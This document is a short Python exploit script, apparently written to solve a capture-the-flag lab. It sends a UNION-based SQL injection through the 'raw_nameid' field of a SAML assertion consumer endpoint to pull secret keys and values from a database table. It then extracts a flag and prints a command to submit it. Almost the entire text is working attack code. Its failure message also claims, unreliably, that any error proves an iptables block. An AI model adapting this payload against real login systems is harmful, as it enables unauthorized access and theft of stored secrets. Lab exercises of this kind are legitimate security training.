#!/usr/bin/env python3
import urllib.request
import urllib.parse
import re

TARGET_URL = "http://172.20.0.10:5000/saml/acs"
PAYLOAD = "admin' UNION SELECT secret_key, 'Enterprise Administrator', secret_value, 'admin@corp' FROM secret_data --"

print("[*] Đang gửi payload SQL Injection tới " + TARGET_URL + "...")
print("[*] Payload: " + PAYLOAD)

data = urllib.parse.urlencode({
    "direct_test": "true",
    "raw_nameid": PAYLOAD
}).encode('utf-8')

req = urllib.request.Request(TARGET_URL, data=data)
try:
    with urllib.request.urlopen(req, timeout=5) as response:
        body = response.read().decode('utf-8')
        flag_match = re.search(r'(FLAG\{[^}]+\})', body)
        if flag_match:
            print("\n" + "="*60)
            print("[+] TẤN CÔNG THÀNH CÔNG! ĐÃ TRÍCH XUẤT ĐƯỢC FLAG:")
            print("    " + flag_match.group(1))
            print("="*60)
            print("[*] Chạy lệnh: submit_flag " + flag_match.group(1) + " để lưu cờ!")
        else:
            print("[+] Yêu cầu đã được gửi. Kiểm tra giao diện web để xem kết quả.")
except Exception as e:
    print("\n[-] KHÔNG THỂ GỬI YÊU CẦU: " + str(e))
    print("[!] Điều này chứng tỏ máy chủ sp-server đã CHẶN HOÀN TOÀN IP của bạn qua iptables Active Response!")
